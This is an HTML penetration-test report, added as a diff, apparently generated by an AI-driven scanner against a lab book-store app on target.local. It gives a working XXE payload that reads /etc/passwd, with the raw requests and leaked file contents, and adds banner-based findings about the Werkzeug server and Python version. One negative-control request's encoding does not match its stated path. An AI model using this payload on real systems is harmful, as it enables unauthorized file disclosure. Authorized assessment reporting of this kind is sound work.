@@ -1,0 +1,437 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqzc9db2-3ga7mn</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [other] XML External Entity (XXE) — Arbitrary Local File Read via POST /addbook</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#f57c00">MEDIUM</span> [misconfig] Werkzeug built-in development server exposed as the production server</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#c9a227">LOW</span> [vulnerable-component] End-of-life Python 3.9 (3.9.25) runtime — no security patches after Oct 2025</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqzc9db2-3ga7mn</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:5000/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T14:54:19.832Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>2 mapped · 2 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>3</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:5000</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>3 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#c9a227">1</b> low</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [other] XML External Entity (XXE) — Arbitrary Local File Read via POST /addbook</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5000/</div>
+<div class="desc">The POST /addbook endpoint parses the `xml` form parameter using an XML parser that resolves SYSTEM (external) entities. An attacker can define a DOCTYPE with a SYSTEM entity pointing to any file on the server (e.g., `file:///etc/passwd`) and inject it into an XML element; the server resolves the entity and echoes its content back in the HTML response. The full contents of `/etc/passwd` were confirmed read and reflected in the `&lt;pre&gt;` block. The XML declaration (`&lt;?xml ...?&gt;`) must be omitted for the entity to resolve; including it causes a parse failure. The `xml` body parameter must be properly URL-encoded so `&amp;xxe;` is not split by the form parser.</div>
+<div><b>Reproduction</b></div><pre>1. POST to http://target.local:5000/addbook with Content-Type: application/x-www-form-urlencoded
+2. Body: xml=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cbook%3E%3Ctitle%3E%26xxe%3B%3C%2Ftitle%3E%3Cauthor%3Etest%3C%2Fauthor%3E%3C%2Fbook%3E
+3. Decoded xml value: &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;book&gt;&lt;title&gt;&amp;xxe;&lt;/title&gt;&lt;author&gt;test&lt;/author&gt;&lt;/book&gt;
+4. The response HTML contains the full /etc/passwd content inside the &amp;lt;title&amp;gt; element in the &amp;lt;pre&amp;gt; result block.
+5. Negative control: same DOCTYPE but pointing to a non-existent path (file:///etc/nonexistent_verdict_probe) returns an empty &amp;lt;title/&amp;gt; — confirms path-dependent content.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzcidxy-l</code> — <code>artifacts/s-0002/ev-mqzcidxy-l/</code></div><div class="lbl">REQUEST</div><pre>POST /addbook HTTP/1.1
+Host: target.local:5000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+xml=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Etc%2Fnonexistent_verdict_probe%22%3E%5D%3E%3Cbook%3E%3Ctitle%3E%26xxe%3B%3C%2Ftitle%3E%3Cauthor%3Etest%3C%2Fauthor%3E%3C%2Fbook%3E</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 358
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:01:20 GMT
+server: Werkzeug/3.1.8 Python/3.9.25
+
+    &lt;html&gt;
+      &lt;body&gt;
+        &lt;!-- templates/result.html --&gt;
+&lt;!-- templates/base.html --&gt;
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;XML Result&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    
+    &lt;pre&gt;You have append this book successfully !&lt;/pre&gt;
+    &lt;p&gt;Result:&lt;/p&gt;
+    &lt;pre&gt;&lt;book&gt;&lt;title/&gt;&lt;author&gt;test&lt;/author&gt;&lt;/book&gt;&lt;/pre&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzchpck-k</code> — <code>artifacts/s-0002/ev-mqzchpck-k/</code></div><div class="lbl">REQUEST</div><pre>POST /addbook HTTP/1.1
+Host: target.local:5000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+xml=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cbook%3E%3Ctitle%3E%26xxe%3B%3C%2Ftitle%3E%3Cauthor%3Etest%3C%2Fauthor%3E%3C%2Fbook%3E</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1204
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:00:48 GMT
+server: Werkzeug/3.1.8 Python/3.9.25
+
+    &lt;html&gt;
+      &lt;body&gt;
+        &lt;!-- templates/result.html --&gt;
+&lt;!-- templates/base.html --&gt;
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;XML Result&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    
+    &lt;pre&gt;You have append this book successfully !&lt;/pre&gt;
+    &lt;p&gt;Result:&lt;/p&gt;
+    &lt;pre&gt;&lt;book&gt;&lt;title&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+&lt;/title&gt;&lt;author&gt;test&lt;/author&gt;&lt;/book&gt;&lt;/pre&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzcifkm-m</code> — <code>artifacts/s-0002/ev-mqzcifkm-m/</code></div><div class="lbl">REQUEST</div><pre>POST /addbook HTTP/1.1
+Host: target.local:5000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Content-Type: application/x-www-form-urlencoded
+
+xml=%3C%21DOCTYPE+foo+%5B%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cbook%3E%3Ctitle%3E%26xxe%3B%3C%2Ftitle%3E%3Cauthor%3Etest%3C%2Fauthor%3E%3C%2Fbook%3E</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 1204
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:01:22 GMT
+server: Werkzeug/3.1.8 Python/3.9.25
+
+    &lt;html&gt;
+      &lt;body&gt;
+        &lt;!-- templates/result.html --&gt;
+&lt;!-- templates/base.html --&gt;
+&lt;!doctype html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;XML Result&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    
+    &lt;pre&gt;You have append this book successfully !&lt;/pre&gt;
+    &lt;p&gt;Result:&lt;/p&gt;
+    &lt;pre&gt;&lt;book&gt;&lt;title&gt;root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+&lt;/title&gt;&lt;author&gt;test&lt;/author&gt;&lt;/book&gt;&lt;/pre&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 2. [misconfig] Werkzeug built-in development server exposed as the production server</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5000/</div>
+<div class="desc">VERSION-BASED / configuration finding (observed via banner, not exploited). The `Server: Werkzeug/3.1.8 Python/3.9.25` header shows the application is served directly by Werkzeug's built-in WSGI development server (Flask `app.run()` / `werkzeug.serving.run_simple`). The Werkzeug project explicitly documents that this server is &quot;not designed to be particularly efficient, stable, or secure&quot; and must NOT be used in production. Concrete risks: limited/ single-threaded request handling makes trivial denial-of-service easy; it lacks production hardening; and if Flask/Werkzeug debug mode is enabled, any unhandled exception exposes the interactive Werkzeug debugger, which permits arbitrary code execution on the host (PIN-protected, but historically bypassable). Debug mode was NOT confirmed in this stage — the 404 returned was a plain Flask error page, not a debugger traceback — so RCE is not asserted; the operator should verify `debug=False` and that the debugger console is unreachable. Werkzeug 3.1.8 as a library version is current (no known unpatched CVE in the 3.1.x line), so this is a deployment-mode issue, not a library-version CVE. Evidence: Server header at GET / (ev-mqzcp6cf-y, ev-mqzcp72k-z). Operator action: front the app with a production WSGI server (gunicorn/uWSGI) behind a reverse proxy, disable debug mode, and strip the Server banner.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:5000/  2. Observe `Server: Werkzeug/3.1.8 Python/3.9.25` — the Werkzeug dev server identifying itself. 3. Confirm it answers as the front-line server (no fronting proxy banner present). Negative control: GET /nonexistent-verdict-404 → distinct 404/207-byte body (ev-mqzcp7sj-10) vs the stable 200/978-byte homepage replays (ev-mqzcp6cf-y, ev-mqzcp72k-z).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzcp7sj-10</code> — <code>artifacts/_/ev-mqzcp7sj-10/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent-verdict-404 HTTP/1.1
+Host: target.local:5000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: close
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:06:38 GMT
+server: Werkzeug/3.1.8 Python/3.9.25
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzcp6cf-y</code> — <code>artifacts/_/ev-mqzcp6cf-y/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:5000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 978
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:06:36 GMT
+server: Werkzeug/3.1.8 Python/3.9.25
+
+    &lt;!-- templates/home.html --&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Library V1: Book Store&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;&lt;h3&gt;Available functions&lt;/h3&gt;&lt;/p&gt;
+&lt;a href=&quot;/addbook&quot;&gt;Upload a book in XML format&lt;/a&gt;&lt;br&gt;
+You can use this example &lt;br/&gt;
+&lt;textarea name=&quot;xml&quot; rows=&quot;20&quot; cols=&quot;50&quot;&gt;
+&lt;!-- book XML example  --&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;Book&gt;
+    &lt;Title&gt;Empire State Chronicles&lt;/Title&gt;
+    &lt;ISBN&gt;123-4567890123&lt;/ISBN&gt;
+    &lt;Editor&gt;John Doe&lt;/Editor&gt;
+    &lt;Publisher&gt;NY Publishing House&lt;/Publisher&gt;
+    &lt;Chapters&gt;
+        &lt;Chapter id=&quot;1&quot;&gt;
+            &lt;Title&gt;Introduction to the Empire&lt;/Title&gt;
+            &lt;Author&gt;Hans Solo&lt;/Author&gt;
+            &lt;Pages&gt;1-42&lt;/Pages&gt;
+            &lt;Contact&gt;hans@nyph.com&lt;/Contact&gt;
+        &lt;/Chapter&gt;
+        &lt;Chapter id=&quot;2&quot;&gt;
+            &lt;Title&gt;The Rise of the City&lt;/Title&gt;
+            &lt;Author&gt;Leia&lt;/Author&gt;
+            &lt;Pages&gt;43-78&lt;/Pages&gt;
+            &lt;Contact&gt;leia@nyph.com&lt;/Contact&gt;
+        &lt;/Chapter&gt;
+    &lt;/Chapters&gt;
+&lt;/Book&gt;
+
+&lt;/textarea&gt;
+&lt;br/&gt;        
+    &lt;/body&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzcp72k-z</code> — <code>artifacts/_/ev-mqzcp72k-z/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:5000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 978
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:06:37 GMT
+server: Werkzeug/3.1.8 Python/3.9.25
+
+    &lt;!-- templates/home.html --&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Library V1: Book Store&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;&lt;h3&gt;Available functions&lt;/h3&gt;&lt;/p&gt;
+&lt;a href=&quot;/addbook&quot;&gt;Upload a book in XML format&lt;/a&gt;&lt;br&gt;
+You can use this example &lt;br/&gt;
+&lt;textarea name=&quot;xml&quot; rows=&quot;20&quot; cols=&quot;50&quot;&gt;
+&lt;!-- book XML example  --&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;Book&gt;
+    &lt;Title&gt;Empire State Chronicles&lt;/Title&gt;
+    &lt;ISBN&gt;123-4567890123&lt;/ISBN&gt;
+    &lt;Editor&gt;John Doe&lt;/Editor&gt;
+    &lt;Publisher&gt;NY Publishing House&lt;/Publisher&gt;
+    &lt;Chapters&gt;
+        &lt;Chapter id=&quot;1&quot;&gt;
+            &lt;Title&gt;Introduction to the Empire&lt;/Title&gt;
+            &lt;Author&gt;Hans Solo&lt;/Author&gt;
+            &lt;Pages&gt;1-42&lt;/Pages&gt;
+            &lt;Contact&gt;hans@nyph.com&lt;/Contact&gt;
+        &lt;/Chapter&gt;
+        &lt;Chapter id=&quot;2&quot;&gt;
+            &lt;Title&gt;The Rise of the City&lt;/Title&gt;
+            &lt;Author&gt;Leia&lt;/Author&gt;
+            &lt;Pages&gt;43-78&lt;/Pages&gt;
+            &lt;Contact&gt;leia@nyph.com&lt;/Contact&gt;
+        &lt;/Chapter&gt;
+    &lt;/Chapters&gt;
+&lt;/Book&gt;
+
+&lt;/textarea&gt;
+&lt;br/&gt;        
+    &lt;/body&gt;
+    &lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 3. [vulnerable-component] End-of-life Python 3.9 (3.9.25) runtime — no security patches after Oct 2025</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:5000/</div>
+<div class="desc">VERSION-BASED finding (matched by banner, not exploited). The HTTP `Server` response header on every page discloses `Werkzeug/3.1.8 Python/3.9.25`, revealing the application runs on CPython 3.9. The Python 3.9 series reached end-of-life in October 2025; as of the assessment date (2026-06-30) it is past EOL and will receive NO further security fixes from python.org — any future CPython 3.9 CVE remains permanently unpatched on this host. 3.9.25 appears to be a late/final security patch in the 3.9 branch, so no specific currently-unpatched CVE is being claimed here; the issue is the EOL status of the interpreter line itself. Evidence: Server header observed at GET / (ev-mqzcp6cf-y, ev-mqzcp72k-z), originally captured by the fingerprint scan as `server: Werkzeug/3.1.8 Python/3.9.25`. Operator action: upgrade to a supported Python line (3.12/3.13) and verify before relying on this as the only risk from the runtime. Also recommended: suppress the version detail from the Server banner to reduce fingerprinting.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:5000/  2. Inspect the response `Server` header: `Werkzeug/3.1.8 Python/3.9.25`. 3. Cross-reference the Python release lifecycle: 3.9 EOL = 2025-10. Negative control: GET /nonexistent-verdict-404 returns a distinct 404/207-byte response (ev-mqzcp7sj-10) vs the stable 200/978-byte homepage (ev-mqzcp6cf-y, ev-mqzcp72k-z).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzcp7sj-10</code> — <code>artifacts/_/ev-mqzcp7sj-10/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent-verdict-404 HTTP/1.1
+Host: target.local:5000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: close
+content-length: 207
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:06:38 GMT
+server: Werkzeug/3.1.8 Python/3.9.25
+
+&lt;!doctype html&gt;
+&lt;html lang=en&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzcp6cf-y</code> — <code>artifacts/_/ev-mqzcp6cf-y/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:5000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 978
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:06:36 GMT
+server: Werkzeug/3.1.8 Python/3.9.25
+
+    &lt;!-- templates/home.html --&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Library V1: Book Store&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;&lt;h3&gt;Available functions&lt;/h3&gt;&lt;/p&gt;
+&lt;a href=&quot;/addbook&quot;&gt;Upload a book in XML format&lt;/a&gt;&lt;br&gt;
+You can use this example &lt;br/&gt;
+&lt;textarea name=&quot;xml&quot; rows=&quot;20&quot; cols=&quot;50&quot;&gt;
+&lt;!-- book XML example  --&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;Book&gt;
+    &lt;Title&gt;Empire State Chronicles&lt;/Title&gt;
+    &lt;ISBN&gt;123-4567890123&lt;/ISBN&gt;
+    &lt;Editor&gt;John Doe&lt;/Editor&gt;
+    &lt;Publisher&gt;NY Publishing House&lt;/Publisher&gt;
+    &lt;Chapters&gt;
+        &lt;Chapter id=&quot;1&quot;&gt;
+            &lt;Title&gt;Introduction to the Empire&lt;/Title&gt;
+            &lt;Author&gt;Hans Solo&lt;/Author&gt;
+            &lt;Pages&gt;1-42&lt;/Pages&gt;
+            &lt;Contact&gt;hans@nyph.com&lt;/Contact&gt;
+        &lt;/Chapter&gt;
+        &lt;Chapter id=&quot;2&quot;&gt;
+            &lt;Title&gt;The Rise of the City&lt;/Title&gt;
+            &lt;Author&gt;Leia&lt;/Author&gt;
+            &lt;Pages&gt;43-78&lt;/Pages&gt;
+            &lt;Contact&gt;leia@nyph.com&lt;/Contact&gt;
+        &lt;/Chapter&gt;
+    &lt;/Chapters&gt;
+&lt;/Book&gt;
+
+&lt;/textarea&gt;
+&lt;br/&gt;        
+    &lt;/body&gt;
+    &lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqzcp72k-z</code> — <code>artifacts/_/ev-mqzcp72k-z/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:5000
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: close
+content-length: 978
+content-type: text/html; charset=utf-8
+date: Mon, 29 Jun 2026 15:06:37 GMT
+server: Werkzeug/3.1.8 Python/3.9.25
+
+    &lt;!-- templates/home.html --&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Library V1: Book Store&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;&lt;h3&gt;Available functions&lt;/h3&gt;&lt;/p&gt;
+&lt;a href=&quot;/addbook&quot;&gt;Upload a book in XML format&lt;/a&gt;&lt;br&gt;
+You can use this example &lt;br/&gt;
+&lt;textarea name=&quot;xml&quot; rows=&quot;20&quot; cols=&quot;50&quot;&gt;
+&lt;!-- book XML example  --&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;Book&gt;
+    &lt;Title&gt;Empire State Chronicles&lt;/Title&gt;
+    &lt;ISBN&gt;123-4567890123&lt;/ISBN&gt;
+    &lt;Editor&gt;John Doe&lt;/Editor&gt;
+    &lt;Publisher&gt;NY Publishing House&lt;/Publisher&gt;
+    &lt;Chapters&gt;
+        &lt;Chapter id=&quot;1&quot;&gt;
+            &lt;Title&gt;Introduction to the Empire&lt;/Title&gt;
+            &lt;Author&gt;Hans Solo&lt;/Author&gt;
+            &lt;Pages&gt;1-42&lt;/Pages&gt;
+            &lt;Contact&gt;hans@nyph.com&lt;/Contact&gt;
+        &lt;/Chapter&gt;
+        &lt;Chapter id=&quot;2&quot;&gt;
+            &lt;Title&gt;The Rise of the City&lt;/Title&gt;
+            &lt;Author&gt;Leia&lt;/Author&gt;
+            &lt;Pages&gt;43-78&lt;/Pages&gt;
+            &lt;Contact&gt;leia@nyph.com&lt;/Contact&gt;
+        &lt;/Chapter&gt;
+    &lt;/Chapters&gt;
+&lt;/Book&gt;
+
+&lt;/textarea&gt;
+&lt;br/&gt;        
+    &lt;/body&gt;
+    &lt;/html&gt;</pre></div>
+</div>
+</body></html>
